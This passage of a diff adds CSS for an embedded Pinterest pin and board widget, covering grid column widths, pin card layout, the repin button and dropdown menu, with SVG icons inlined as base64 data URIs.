g1IDUwLjQxOSwxMS43MTggQzQ5LjYxOSwxMi4zNzQgNDguNzQzLDEyLjgwMiA0Ny41MDMsMTIuODAyIEM0Ni4yODMsMTIuODAyIDQ1LjY0NywxMi4xNjYgNDUuNjQ3LDEwLjgxMyBDNDUuOTM0LDEwLjkwMiA0Ni42ODMsMTEuMDA4IDQ3LjE3NSwxMS4wMDggQzQ5LjI0NiwxMS4wMDggNTAuNjUxLDEwLjA2NCA1MC42NTEsOC4xODQgQzUwLjY1MSw3LjE3MiA0OS43NjksNi4xMDggNDguMDA1LDYuMTA4IEM0NS42OTIsNi4xMDggNDQuMzk5LDcuNTc1IDQzLjgzMiw5LjE4NCBMNDMuMzU1LDkuMDc2IEM0My40ODksOC43MTcgNDMuNTc3LDguMzAxIDQzLjU3Nyw3Ljg0NSBDNDMuNTc3LDcuMDQ1IDQzLjA4NSw2LjEwNyA0MS43NjIsNi4xMDcgQzQwLjg0NSw2LjEwNyAzOS45NzQsNi43MDggMzkuMzcsNy42MSBMMzkuNjI2LDYuNjA2IEMzOS42NjQsNi40NTIgMzkuNTk5LDYuMjgzIDM5LjM1OSw2LjI4MyBMMzguMDA2LDYuMjgzIEMzNy44MTQsNi4yODMgMzcuNjc4LDYuMzU0IDM3LjYyLDYuNTcgTDM2LjY2NywxMC4zMTIgQzM2LjM5LDExLjQzIDM0LjkxMywxMi44MTQgMzMuMDU3LDEyLjgxNCBDMzEuODM1LDEyLjgxNCAzMS4yMDEsMTIuMTM4IDMxLjIwMSwxMC43ODQgQzMxLjUyMiwxMC45MTIgMzIuMjM1LDExLjAyIDMyLjcyNiwxMS4wMiBDMzQuODc5LDExLjAyIDM2LjIwNSwxMC4wODEgMzYuMjA1LDguMTk3IEMzNi4yMDUsNy4xODcgMzUuMzEzLDYuMTI0IDMzLjU2LDYuMTI0IEMzMC45NDUsNi4xMjQgMjkuMzQ1LDguMTQ4IDI5LjA3OSwxMC40NDEgQzI4Ljk2NiwxMS4zOTQgMjguMTU2LDEyLjcwMyAyNy4yODQsMTIuNzAzIEMyNi44NjQsMTIuNzAzIDI2LjYyOCwxMi40MzYgMjYuNjI4LDExLjk4NSBDMjYuNjI4LDExLjU5NSAyNi45MDEsMTAuNjMxIDI3LjIwMiw5LjQzMiBDMjcuMzA1LDkuMDMyIDI3LjQ1Niw4LjQxNiAyNy42MjYsNy43NCBMMjkuMDUxLDcuNzQgQzI5LjI1OSw3Ljc0IDI5LjM4Miw3LjY0NyAyOS40MzEsNy40NTMgQzI5LjQ5OCw3LjE2NSAyOS42MjIsNi42NzMgMjkuNjU2LDYuNTQgQzI5LjcwNCw2LjM2NiAyOS42MDEsNi4yMjcgMjkuNDA0LDYuMjI3IEwyOC4wMDksNi4yMjcgTDI4LjY2NiwzLjYwNiBDMjguNzI3LDMuMzQ2IDI4LjUwOCwzLjE5NiAyOC4yODEsMy4yNDQgQzI4LjI4MSwzLjI0NCAyNy4yMDQsMy40NTUgMjcuMDA2LDMuNDk4IEMyNi44MDQsMy41MzkgMjYuNjQ3LDMuNjQ2IDI2LjU3NSwzLjkzOSBMMjYuMDExLDYuMjI1IEwyNC45MDQsNi4yMjUgQzI0LjY5MSw2LjIyNSAyNC41NjgsNi4zMTIgMjQuNTIyLDYuNTA5IEMyNC40NTMsNi43OTIgMjQuMzI3LDcuMjg4IDI0LjI5Myw3LjQyMiBDMjQuMjQ1LDcuNiAyNC4zNSw3LjczNSAyNC41NSw3LjczNSBMMjUuNjQ1LDcuNzM1IEMyNS42MzgsNy43NjkgMjUuMjUsOS4yNDIgMjQuOTM3LDEwLjU2NSBDMjQuNzg5LDExLjIwNCAyNC4yOTMsMTIuNjkxIDIzLjQ4MSwxMi42OTEgQzIyLjk5OSwxMi42OTEgMjIuNzk0LDEyLjQ0NSAyMi43OTQsMTEuOTIyIEMyMi43OTQsMTEuMDk2IDIzLjYwNiw5LjAzMSAyMy42MDYsOC4wOTMgQzIzLjYwNiw2Ljg0MiAyMi45MzUsNi4xMTQgMjEuNTU5LDYuMTE0IEMyMC42OTMsNi4xMTQgMTkuNzk1LDYuNjc4IDE5LjQxNCw3LjE3MSBDMTkuNDE0LDcuMTcxIDE5LjUyOSw2Ljc3MSAxOS41Nyw2LjYxNyBDMTkuNjEyLDYuNDUzIDE5LjUyOSw2LjI5MiAxOS4zMTQsNi4yOTIgTDE3Ljk3MSw2LjI5MiBDMTcuNjg0LDYuMjkyIDE3LjYwOSw2LjQ0NiAxNy41NjcsNi42MTIgTDE2LjU5OCwxMC40MDYgQzE2LjI3NSwxMS42NTcgMTUuNTAzLDEyLjcwMyAxNC42OCwxMi43MDMgQzE0LjI1LDEyLjcwMyAxNC4wNjUsMTIuNDM2IDE0LjA2NSwxMS45NzQgQzE0LjA2NSwxMS41ODUgMTQuMzEzLDEwLjYyMSAxNC42MTksOS40MjEgQzE0Ljk4Myw3Ljk2NSAxNS4zMDYsNi43NjYgMTUuMzQyLDYuNjIyIEMxNS4zODgsNi40NDQgMTUuMzA3LDYuMjg4IDE1LjA3NSw2LjI4OCBMMTMuNzIyLDYuMjg4IEMxMy40NzYsNi4yODggMTMuMzg4LDYuNDE0IDEzLjMzOCw2LjU5NSBDMTMuMzM4LDYuNTk1IDEyLjk1OSw4LjAzNCAxMi41NTcsOS42NDEgQzEyLjI3LDEwLjgwNiAxMS45NDIsMTEuOTkzIDExLjk0MiwxMi41NDkgQzExLjk0MiwxMy41NDMgMTIuMzg2LDE0LjI5MiAxMy42MTYsMTQuMjkyIEMxNC41NTksMTQuMjkyIDE1LjMwOCwxMy44MSAxNS44ODIsMTMuMjAyIEwxNS43MzksMTMuNzY2IEMxNS42ODcsMTMuOTU3IDE1Ljc0OSwxNC4xMjUgMTUuOTY3LDE0LjEyNSBMMTcuMzUyLDE0LjEyNSBDMTcuNTkzLDE0LjEyNSAxNy42ODUsMTQuMDI3IDE3LjczNiwxMy44MTcgTDE4LjgzMyw5LjU1MSBDMTkuMTAzLDguNDUxIDE5Ljc3Nyw3LjcyNiAyMC43Myw3LjcyNiBDMjEuMTgxLDcuNzI2IDIxLjU3MSw4LjAyNCAyMS41MjYsOC42MDUgQzIxLjQ3NSw5LjI0NCAyMC43MDYsMTEuNTM4IDIwLjcwNiwxMi41NDUgQzIwLjcwNiwxMy4zMDMgMjAuOTg5LDE0LjI4OCAyMi40MjIsMTQuMjg4IEMyMy4zOTYsMTQuMjg4IDI0LjExNCwxMy44MTYgMjQuNjM3LDEzLjIxMSBDMjQuODMyLDEzLjg0OSAyNS4zMzQsMTQuMjggMjYuMjY3LDE0LjI4IEMyNy44MTYsMTQuMjggMjguNzQ5LDEzLjM2IDI5LjMwMiwxMi40MzggQzI5Ljc1MSwxMy41MTUgMzAuODE1LDE0LjI4NCAzMi4zNzksMTQuMjg0IEMzMy45NjgsMTQuMjg0IDM1LjIwNCwxMy42MSAzNi4wNzYsMTIuNjk3IEwzNS44MDYsMTMuNzgxIEMzNS43NTUsMTMuOTczIDM1Ljg0MSwxNC4xMjUgMzYuMDY3LDE0LjEyNSBMMzcuNDM3LDE0LjEyNSBDMzcuNjIxLDE0LjEyNSAzNy43NTcsMTQuMDI4IDM3LjgwNiwxMy44MyBDMzcuODI4LDEzLjczNCAzOC4wMjcsMTIuOTY5IDM4LjMwOCwxMS44ODIgQzM4Ljg0Miw5LjgwMSAzOS43MDMsNy42NDIgNDAuOTkzLDcuNjQyIEM0MS40NDksNy42NDIgNDEuNjM3LDcuODk3IDQxLjYzNyw4LjI5OCBDNDEuNjM3LDguNDg3IDQxLjU4MSw4LjY0OSA0MS41MzQsOC43MzkgQzQwLjkwOSw4LjYxNCA0MC40MDQsOC45MjIgNDAuNDA0LDkuNTkgQzQwLjQwNCwxMC4wMjcgNDAuODYzLDEwLjQyMyA0MS40ODEsMTAuNDIzIEM0MS45NTMsMTAuNDIzIDQyLjM0NSwxMC4zMDggNDIuNjU3LDEwLjA5NyBDNDIuOTU0LDEwLjE1OSA0My4yNjIsMTAuMjI1IDQzLjU4LDEwLjI5NyBDNDMuNTM5LDEwLjYxIDQzLjUwOCwxMC45MTggNDMuNTA4LDExLjIwNyBDNDMuNTA4LDEyLjg3OSA0NC43NjksMTQuMjk3IDQ2LjkwMiwxNC4yOTcgQzQ4LjU4NCwxNC4yOTcgNDkuNjUsMTMuNzMzIDUwLjY2NSwxMi44OTggQzUxLjE0NywxMy42NzggNTIuMzQ3LDE0LjMwMyA1My45MjYsMTQuMzAzIEM1Ni4wOSwxNC4zMDMgNTcuMzIsMTMuMTc1IDU3LjMyLDExLjY4OCBDNTcuMzIsMTAuMzM1IDU2LjIxMyw5Ljg0MyA1NS4wNzQsOS40MzMgQzU0LjE1Miw5LjA5NCA1My4zNzIsOC45MiA1My4zNzIsOC4yNjQgQzUzLjM3Miw3LjcyIDUzLjgwMyw3LjQ3NCA1NC41MjEsNy40NzQgQzU0Ljk5Miw3LjQ3NCA1NS4zNDEsNy41NzcgNTUuNTM2LDcuNjI4IEM1NS43Miw4LjA4OSA1Ni4xMSw4LjYxMiA1Ni43NzcsOC42MTIgQzU3LjMzNSw4LjYxMiA1Ny41ODcsOC4xNzEgNTcuNTg3LDcuNzYxIEM1Ny41ODcsNi42MDIgNTUuNjU3LDYuNDc5IDU1LjY1NywzLjk5OCBDNTUuNjU3LDIuNDUgNTYuNTMzLDEuMTc4IDU4LjM0MywxLjE3OCBDNTkuNjAzLDEuMTc4IDYwLjQyNSwxLjk3OCA2MC40MjUsMy4yNiBDNjAuNDI1LDQuMzE2IDU5Ljc3OSw2LjIxMyA1OS43NzksNi4yMTMgTDU4LjY4Miw2LjIxMyBDNTguNDcyLDYuMjEzIDU4LjM0Nyw2LjI5NSA1OC4yOTksNi40OSBMNTguMDcxLDcuNDAyIEM1OC4wMjcsNy41NzcgNTguMTI4LDcuNzEgNTguMzI3LDcuNzEgTDU5LjM5Myw3LjcxIEM1OS42MTcsNy43NDkgNTguMjg2LDEyLjQ1IDU4LjI4NiwxMi41MjkgQzU4LjI4NiwxMy41MjQgNTguODQ4LDE0LjI3MiA2MC4wNzUsMTQuMjcyIEM2MS44MDgsMTQuMjcyIDYyLjg5NSwxMy4xNDQgNjMuMzY3LDExLjUwNCBDNjMuNDA0LDExLjM3MyA2My4zMzMsMTEuMjcgNjMuMjAzLDExLjI3IEw2Mi41MzYsMTEuMjcgQzYyLjQwMywxMS4yNyA2Mi4zMjcsMTEuMzQ0IDYyLjI5NCwxMS40NzUgQzYyLjE0OCwxMi4wNiA2MS43NzgsMTIuNjc1IDYxLjA0MywxMi42NzUgQzYwLjYyMywxMi42NzUgNjAuMzg1LDEyLjQwOCA2MC4zODUsMTEuOTUxIEM2MC4zODUsMTEuNTYxIDYxLjM5LDcuNzA5IDYxLjM5LDcuNzA5IEw2Mi45MDYsNy43MzYgTDYyLjkwNiw3LjczNiBaIE0xNi4wOTksNC4xMyBDMTYuMDUyLDQuODQ1IDE1LjQ1Myw1LjQyNiAxNC43NjMsNS40MjYgQzE0LjA3Niw1LjQyNiAxMy41NTQsNC44NDUgMTMuNjA1LDQuMTI5IEMxMy42NTYsMy40MTQgMTQuMjUxLDIuODMzIDE0Ljk0LDIuODMzIEMxNS42MjksMi44MzMgMTYuMTUsMy40MDkgMTYuMDk5LDQuMTI1IEwxNi4wOTksNC4xMyBaIE02LjQ1LDAgQzIuMjQ2LDAgMC4wMSwyLjgyNSAwLjAxLDUuOTAyIEMwLDcuMzQyIDAuNzY0LDkuMTIyIDEuOTc5LDkuNjkgQzIuMTY0LDkuNzc1IDIuMjYyLDkuNzM3IDIuMzA0LDkuNTU5IEMyLjMzNSw5LjQyMyAyLjUwMSw4Ljc2MiAyLjU3NSw4LjQ1MyBDMi42MDYsOC4zNTUgMi41OTUsOC4yNjkgMi41MTMsOC4xNzIgQzIuMTEzLDcuNjg2IDEuNzk1LDYuNzg4IDEuNzk1LDUuOTQ5IEMxLjc5NSwzLjggMy40MjYsMS43MiA2LjE5NCwxLjcyIEM4LjU5NCwxLjcyIDEwLjI2NSwzLjM1IDEwLjI2NSw1LjY4NSBDMTAuMjY1LDguMzIyIDguOTQyLDEwLjE0OCA3LjIwOSwxMC4xNDggQzYuMjU2LDEwLjE0OCA1LjUzOCw5LjM1OSA1Ljc2NCw4LjM4NyBDNi4wNDEsNy4yMjggNi41NzQsNS45NzcgNi41NzQsNS4xMzYgQzYuNTc0LDQuMzg4IDYuMTc0LDMuNzYyIDUuMzQzLDMuNzYyIEM0LjM2OSwzLjc2MiAzLjU4LDQuNzY3IDMuNTgsNi4xMzEgQzMuNTgsNi45OTIgMy44NzcsNy41NzcgMy44NzcsNy41NzcgTDIuNzA3LDEyLjQyOCBDMi40MDcsMTMuNzIgMi43NDgsMTUuODExIDIuNzc3LDE1Ljk5MyBDMi43OTIsMTYuMDkgMi45LDE2LjEyNCAyLjk2MSwxNi4wNDEgQzMuMDU4LDE1LjkxNSA0LjIyMywxNC4xNjkgNC41NTEsMTIuOTA2IEw1LjE1NiwxMC41ODggQzUuNDc3LDExLjE5MyA2LjQwNCwxMS43MDYgNy4zOTEsMTEuNzA2IEMxMC4zMzEsMTEuNzA2IDEyLjQ1LDkuMDAzIDEyLjQ1LDUuNjQ0IEMxMi40NSwyLjQyNCA5LjgyMiwwLjAxNCA2LjQ0MSwwLjAxNCBMNi40NSwwIFoiIGZpbGw9IiNiZDA4MWMiPjwvcGF0aD48L2c+PC9zdmc+) 50% 50% no-repeat;
+  background-size: 60px 15px;
+}
+ .PIN_1471802412739_embed_grid .PIN_1471802412739_ft .PIN_1471802412739_button:hover { 
+  box-shadow: inset 0 0 1px #000;
+}
+ .PIN_1471802412739_embed_grid.PIN_1471802412739_noscroll .PIN_1471802412739_bd { 
+  overflow: hidden;
+}
+ .PIN_1471802412739_embed_grid.PIN_1471802412739_board .PIN_1471802412739_hd .PIN_1471802412739_pinner { 
+  top: 10px;
+}
+ .PIN_1471802412739_embed_grid.PIN_1471802412739_board .PIN_1471802412739_hd .PIN_1471802412739_board { 
+  white-space: nowrap;
+  overflow: hidden;
+  text-overflow: ellipsis;
+  width: 75%;
+  position: absolute;
+  bottom: 10px;
+  left: 56px;
+  color: #8e8e8e;
+  font-size: 12px;
+}
+ .PIN_1471802412739_embed_grid.PIN_1471802412739_c2 { 
+  max-width: 494px;
+  min-width: 140px;
+}
+ .PIN_1471802412739_embed_grid.PIN_1471802412739_c2 .PIN_1471802412739_bd .PIN_1471802412739_ct .PIN_1471802412739_col { 
+  width: 50%;
+}
+ .PIN_1471802412739_embed_grid.PIN_1471802412739_c3 { 
+  max-width: 731px;
+  min-width: 200px;
+}
+ .PIN_1471802412739_embed_grid.PIN_1471802412739_c3 .PIN_1471802412739_bd .PIN_1471802412739_ct .PIN_1471802412739_col { 
+  width: 33.33%;
+}
+ .PIN_1471802412739_embed_grid.PIN_1471802412739_c4 { 
+  max-width: 968px;
+  min-width: 260px;
+}
+ .PIN_1471802412739_embed_grid.PIN_1471802412739_c4 .PIN_1471802412739_bd .PIN_1471802412739_ct .PIN_1471802412739_col { 
+  width: 25%;
+}
+ .PIN_1471802412739_embed_grid.PIN_1471802412739_c5 { 
+  max-width: 1205px;
+  min-width: 320px;
+}
+ .PIN_1471802412739_embed_grid.PIN_1471802412739_c5 .PIN_1471802412739_bd .PIN_1471802412739_ct .PIN_1471802412739_col { 
+  width: 20%;
+}
+ .PIN_1471802412739_embed_grid.PIN_1471802412739_c6 { 
+  max-width: 1442px;
+  min-width: 380px;
+}
+ .PIN_1471802412739_embed_grid.PIN_1471802412739_c6 .PIN_1471802412739_bd .PIN_1471802412739_ct .PIN_1471802412739_col { 
+  width: 16.66%;
+}
+ .PIN_1471802412739_embed_grid.PIN_1471802412739_c7 { 
+  max-width: 1679px;
+  min-width: 440px;
+}
+ .PIN_1471802412739_embed_grid.PIN_1471802412739_c7 .PIN_1471802412739_bd .PIN_1471802412739_ct .PIN_1471802412739_col { 
+  width: 14.28%;
+}
+ .PIN_1471802412739_embed_grid.PIN_1471802412739_c8 { 
+  max-width: 1916px;
+  min-width: 500px;
+}
+ .PIN_1471802412739_embed_grid.PIN_1471802412739_c8 .PIN_1471802412739_bd .PIN_1471802412739_ct .PIN_1471802412739_col { 
+  width: 12.5%;
+}
+ .PIN_1471802412739_embed_grid.PIN_1471802412739_c9 { 
+  max-width: 2153px;
+  min-width: 560px;
+}
+ .PIN_1471802412739_embed_grid.PIN_1471802412739_c9 .PIN_1471802412739_bd .PIN_1471802412739_ct .PIN_1471802412739_col { 
+  width: 11.11%;
+}
+ .PIN_1471802412739_embed_grid.PIN_1471802412739_c10 { 
+  max-width: 2390px;
+  min-width: 620px;
+}
+ .PIN_1471802412739_embed_grid.PIN_1471802412739_c10 .PIN_1471802412739_bd .PIN_1471802412739_ct .PIN_1471802412739_col { 
+  width: 10%;
+}
+ .PIN_1471802412739_embed_pin { 
+  width: 100%;
+  min-width: 160px;
+  max-width: 236px;
+  display: inline-block;
+  box-sizing: border-box;
+  box-shadow: inset 0 0 1px #000;
+  border-radius: 5px;
+  overflow: hidden;
+  font: 12px "Helvetica Neue", Helvetica, arial, sans-serif;
+  color: #363636;
+  background: #fff;
+  cursor: pointer;
+  -webkit-font-smoothing: antialiased;
+}
+ .PIN_1471802412739_embed_pin * { 
+  display: block;
+  position: relative;
+  font: inherit;
+  cursor: inherit;
+  box-sizing: inherit;
+  margin: 0;
+  padding: 0;
+  text-align: left;
+}
+ .PIN_1471802412739_embed_pin .PIN_1471802412739_bd { 
+  border-bottom: 1px solid rgba(0, 0, 0, 0.09);
+}
+ .PIN_1471802412739_embed_pin .PIN_1471802412739_bd .PIN_1471802412739_hd { 
+  border-bottom: 1px solid rgba(0, 0, 0, 0.09);
+}
+ .PIN_1471802412739_embed_pin .PIN_1471802412739_bd .PIN_1471802412739_hd .PIN_1471802412739_container { 
+  width: 100%;
+}
+ .PIN_1471802412739_embed_pin .PIN_1471802412739_bd .PIN_1471802412739_hd .PIN_1471802412739_container .PIN_1471802412739_img,  .PIN_1471802412739_embed_pin .PIN_1471802412739_bd .PIN_1471802412739_hd .PIN_1471802412739_container .PIN_1471802412739_iframe,  .PIN_1471802412739_embed_pin .PIN_1471802412739_bd .PIN_1471802412739_hd .PIN_1471802412739_container .PIN_1471802412739_video { 
+  width: 100%;
+  height: 100%;
+  position: absolute;
+  left: 0;
+  background: transparent url() 0 0 no-repeat;
+  background-size: cover;
+  border: none;
+}
+ .PIN_1471802412739_embed_pin .PIN_1471802412739_bd .PIN_1471802412739_hd .PIN_1471802412739_container .PIN_1471802412739_native { 
+  height: 64px;
+  width: 64px;
+  background: transparent url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGhlaWdodD0iNjNweCIgd2lkdGg9IjYzcHgiIHZpZXdCb3g9IjAgMCA2NCA2NCI+PGc+PHBhdGggZD0iTSAzMiAzMiBtIC0zMiwgMCBhIDMxLCAzMSAwIDEsIDAgNjMsIDAgYSAzMSwgMzEgMCAxLDAgLTYzLCAwIHoiIGZpbGw9IiMwMDAiPjwvcGF0aD48cGF0aCBkPSJNIDI1IDE5IEwgNDggMzIgIEwgMjUgNDUgWiIgZmlsbD0iI2ZmZiI+PC9wYXRoPjwvZz48L3N2Zz4=) 0 0 no-repeat;
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  margin-top: -32px;
+  margin-left: -32px;
+  opacity: .75;
+}
+ .PIN_1471802412739_embed_pin .PIN_1471802412739_bd .PIN_1471802412739_hd .PIN_1471802412739_container .PIN_1471802412739_control { 
+  width: 50px;
+  height: 24px;
+  position: absolute;
+  bottom: 12px;
+  left: 12px;
+  background: rgba(0, 0, 0, .4);
+  color: #fff;
+  box-shadow: 0 0 2px rgba(0, 0, 0, .2);
+  border: 2px solid rgba(255, 255, 255, .68);
+  border-radius: 13px;
+}
+ .PIN_1471802412739_embed_pin .PIN_1471802412739_bd .PIN_1471802412739_hd .PIN_1471802412739_container .PIN_1471802412739_control.PIN_1471802412739_paused::after,  .PIN_1471802412739_embed_pin .PIN_1471802412739_bd .PIN_1471802412739_hd .PIN_1471802412739_container .PIN_1471802412739_control.PIN_1471802412739_playing::after { 
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  font-size: 10px;
+  line-height: 19px;
+  white-space: pre;
+  font-weight: bold;
+  font-style: normal;
+  text-align: center;
+}
+ .PIN_1471802412739_embed_pin .PIN_1471802412739_bd .PIN_1471802412739_hd .PIN_1471802412739_container .PIN_1471802412739_control.PIN_1471802412739_paused::after { 
+  content: "▶ GIF";
+}
+ .PIN_1471802412739_embed_pin .PIN_1471802412739_bd .PIN_1471802412739_hd .PIN_1471802412739_container .PIN_1471802412739_control.PIN_1471802412739_playing::after { 
+  content: "❙ ❙ GIF";
+}
+ .PIN_1471802412739_embed_pin .PIN_1471802412739_bd .PIN_1471802412739_hd .PIN_1471802412739_repin { 
+  position: absolute;
+  top: 10px;
+  left: 10px;
+  height: 28px;
+  width: auto;
+  color: #fff;
+  background: #bd081c url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGhlaWdodD0iMzBweCIgd2lkdGg9IjMwcHgiIHZpZXdCb3g9Ii0xIC0xIDMxIDMxIj48Zz48cGF0aCBkPSJNMjkuNDQ5LDE0LjY2MiBDMjkuNDQ5LDIyLjcyMiAyMi44NjgsMjkuMjU2IDE0Ljc1LDI5LjI1NiBDNi42MzIsMjkuMjU2IDAuMDUxLDIyLjcyMiAwLjA1MSwxNC42NjIgQzAuMDUxLDYuNjAxIDYuNjMyLDAuMDY3IDE0Ljc1LDAuMDY3IEMyMi44NjgsMC4wNjcgMjkuNDQ5LDYuNjAxIDI5LjQ0OSwxNC42NjIiIGZpbGw9IiNmZmYiIHN0cm9rZT0iI2ZmZiIgc3Ryb2tlLXdpZHRoPSIxIj48L3BhdGg+PHBhdGggZD0iTTE0LjczMywxLjY4NiBDNy41MTYsMS42ODYgMS42NjUsNy40OTUgMS42NjUsMTQuNjYyIEMxLjY2NSwyMC4xNTkgNS4xMDksMjQuODU0IDkuOTcsMjYuNzQ0IEM5Ljg1NiwyNS43MTggOS43NTMsMjQuMTQzIDEwLjAxNiwyMy4wMjIgQzEwLjI1MywyMi4wMSAxMS41NDgsMTYuNTcyIDExLjU0OCwxNi41NzIgQzExLjU0OCwxNi41NzIgMTEuMTU3LDE1Ljc5NSAxMS4xNTcsMTQuNjQ2IEMxMS4xNTcsMTIuODQyIDEyLjIxMSwxMS40OTUgMTMuNTIyLDExLjQ5NSBDMTQuNjM3LDExLjQ5NSAxNS4xNzUsMTIuMzI2IDE1LjE3NSwxMy4zMjMgQzE1LjE3NSwxNC40MzYgMTQuNDYyLDE2LjEgMTQuMDkzLDE3LjY0MyBDMTMuNzg1LDE4LjkzNSAxNC43NDUsMTkuOTg4IDE2LjAyOCwxOS45ODggQzE4LjM1MSwxOS45ODggMjAuMTM2LDE3LjU1NiAyMC4xMzYsMTQuMDQ2IEMyMC4xMzYsMTAuOTM5IDE3Ljg4OCw4Ljc2NyAxNC42NzgsOC43NjcgQzEwLjk1OSw4Ljc2NyA4Ljc3NywxMS41MzYgOC43NzcsMTQuMzk4IEM4Ljc3NywxNS41MTMgOS4yMSwxNi43MDkgOS43NDksMTcuMzU5IEM5Ljg1NiwxNy40ODggOS44NzIsMTcuNiA5Ljg0LDE3LjczMSBDOS43NDEsMTguMTQxIDkuNTIsMTkuMDIzIDkuNDc3LDE5LjIwMyBDOS40MiwxOS40NCA5LjI4OCwxOS40OTEgOS4wNCwxOS4zNzYgQzcuNDA4LDE4LjYyMiA2LjM4NywxNi4yNTIgNi4zODcsMTQuMzQ5IEM2LjM4NywxMC4yNTYgOS4zODMsNi40OTcgMTUuMDIyLDYuNDk3IEMxOS41NTUsNi40OTcgMjMuMDc4LDkuNzA1IDIzLjA3OCwxMy45OTEgQzIzLjA3OCwxOC40NjMgMjAuMjM5LDIyLjA2MiAxNi4yOTcsMjIuMDYyIEMxNC45NzMsMjIuMDYyIDEzLjcyOCwyMS4zNzkgMTMuMzAyLDIwLjU3MiBDMTMuMzAyLDIwLjU3MiAxMi42NDcsMjMuMDUgMTIuNDg4LDIzLjY1NyBDMTIuMTkzLDI0Ljc4NCAxMS4zOTYsMjYuMTk2IDEwLjg2MywyNy4wNTggQzEyLjA4NiwyNy40MzQgMTMuMzg2LDI3LjYzNyAxNC43MzMsMjcuNjM3IEMyMS45NSwyNy42MzcgMjcuODAxLDIxLjgyOCAyNy44MDEsMTQuNjYyIEMyNy44MDEsNy40OTUgMjEuOTUsMS42ODYgMTQuNzMzLDEuNjg2IiBmaWxsPSIjYmQwODFjIj48L3BhdGg+PC9nPjwvc3ZnPg==) 5px 50% no-repeat;
+  background-size: 18px 18px;
+  text-indent: 28px;
+  font: 14px/28px "Helvetica Neue", Helvetica, Arial, "sans-serif";
+  font-weight: bold;
+  border-radius: 4px;
+  padding: 0 6px 0 0;
+}
+ .PIN_1471802412739_embed_pin .PIN_1471802412739_bd .PIN_1471802412739_hd .PIN_1471802412739_repin:hover { 
+  background-color: #aa0719;
+  box-shadow: none;
+}
+ .PIN_1471802412739_embed_pin .PIN_1471802412739_bd .PIN_1471802412739_source { 
+  height: 38px;
+  border-bottom: 1px solid rgba(0, 0, 0, 0.09);
+}
+ .PIN_1471802412739_embed_pin .PIN_1471802412739_bd .PIN_1471802412739_source .PIN_1471802412739_img { 
+  position: absolute;
+  top: 50%;
+  margin-top: -8px;
+  left: 10px;
+  height: 16px;
+  width: 16px;
+  background: transparent url() 0 0 no-repeat;
+  background-size: 16px 16px;
+}
+ .PIN_1471802412739_embed_pin .PIN_1471802412739_bd .PIN_1471802412739_source .PIN_1471802412739_domain { 
+  line-height: 38px;
+  max-width: 75%;
+  white-space: nowrap;
+  overflow: hidden;
+  text-overflow: ellipsis;
+  font-weight: bold;
+  color: #b9b9b9;
+  position: absolute;
+  top: 0px;
+  left: 35px;
+}
+ .PIN_1471802412739_embed_pin .PIN_1471802412739_bd .PIN_1471802412739_source.PIN_1471802412739_nofav .PIN_1471802412739_img { 
+  display: none;
+}
+ .PIN_1471802412739_embed_pin .PIN_1471802412739_bd .PIN_1471802412739_source.PIN_1471802412739_nofav .PIN_1471802412739_domain { 
+  max-width: 85%;
+  left: 10px;
+}
+ .PIN_1471802412739_embed_pin .PIN_1471802412739_bd .PIN_1471802412739_source .PIN_1471802412739_menu { 
+  height: inherit;
+}
+ .PIN_1471802412739_embed_pin .PIN_1471802412739_bd .PIN_1471802412739_source .PIN_1471802412739_menu .PIN_1471802412739_toggle { 
+  position: absolute;
+  top: 0;
+  right: 5px;
+  height: inherit;
+  width: 30px;
+  border-bottom: 1px solid rgba(0, 0, 0, 0.09);
+  background: #fff url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGhlaWdodD0iNXB4IiB3aWR0aD0iMjBweCIgdmlld0JveD0iMCAwIDIwIDUiPjxnPjxwYXRoIGQ9Ik0xNy41LDUgQzE4Ljg4MSw1IDIwLDMuODgxIDIwLDIuNSBDMjAsMS4xMTkgMTguODgxLDAgMTcuNSwwIEMxNi4xMTksMCAxNSwxLjExOSAxNSwyLjUgQzE1LDMuODgxIDE2LjExOSw1IDE3LjUsNSBaIE0xMCw1IEMxMS4zOCw1IDEyLjUsMy44ODEgMTIuNSwyLjUgQzEyLjUsMS4xMTkgMTEuMzgsMCAxMCwwIEM4LjYyLDAgNy41LDEuMTE5IDcuNSwyLjUgQzcuNSwzLjg4MSA4LjYyLDUgMTAsNSBNMi41LDUgQzMuODgxLDUgNSwzLjg4MSA1LDIuNSBDNSwxLjExOSAzLjg4MSwwIDIuNSwwIEMxLjEyLDAgMCwxLjExOSAwLDIuNSBDMCwzLjg4MSAxLjEyIDUsMi41LDUgWiIgZmlsbD0iI2I1YjViNSI+PC9wYXRoPjwvZz48L3N2Zz4=) 50% 50% no-repeat;
+  background-size: fill;
+}
+ .PIN_1471802412739_embed_pin .PIN_1471802412739_bd .PIN_1471802412739_source .PIN_1471802412739_menu .PIN_1471802412739_dropdown { 
+  display: none;
+  border-radius: 5px;
+  box-shadow: 0 1px 3px rgba(0, 0, 0, .33);
+  font-weight: bold;
+  font-size: 12px;
+  background: #fff;
+  text-align: left;
+  padding: 10px;
+  position: absolute;
+  max-width: 195px;
+  right: 10px;
+  top: 39px;
+  z-index: 1;
+}
+ .PIN_1471802412739_embed_pin .PIN_1471802412739_bd .PIN_1471802412739_source .PIN_1471802412739_menu .PIN_1471802412739_dropdown::after { 
+  content: "";
+  position: absolute;
+  top: -6px;
+  right: 1px;
+  border-bottom: 8px solid #fff;
+  border-right: 8px solid transparent;
+  border-left: 8px solid transparent;
+}
+ .PIN_1471802412739_embed_pin .PIN_1471802412739_bd .PIN_1471802412739_source .PIN_1471802412739_menu .PIN_1471802412739_dropdown::before { 
+  content: "";
+  position: absolute;
+  top: -7px;
+  right: 2px;
+  border-bottom: 7px solid #e2e2e2;
+  border-right: 7px solid transparent;
+  border-left: 7px solid transparent;
+}
+ .PIN_1471802412739_embed_pin .PIN_1471802412739_bd .PIN_1471802412739_description { 
+  font-size: 14px;
+  line-height: 17px;
+  margin: 8px 12px;
+}
+ .PIN_1471802412739_embed_pin .PIN_1471802412739_bd .PIN_1471802412739_attribution { 
+  height: 22px;
+  margin-top: 5px;
+}
+ .PIN_1471802412739_embed_pin .PIN_1471802412739_bd .PIN_1471802412739_attribution .PIN_1471802412739_img { 
+  position: absolute;
+  top: 50%;
+  margin-top: -8px;
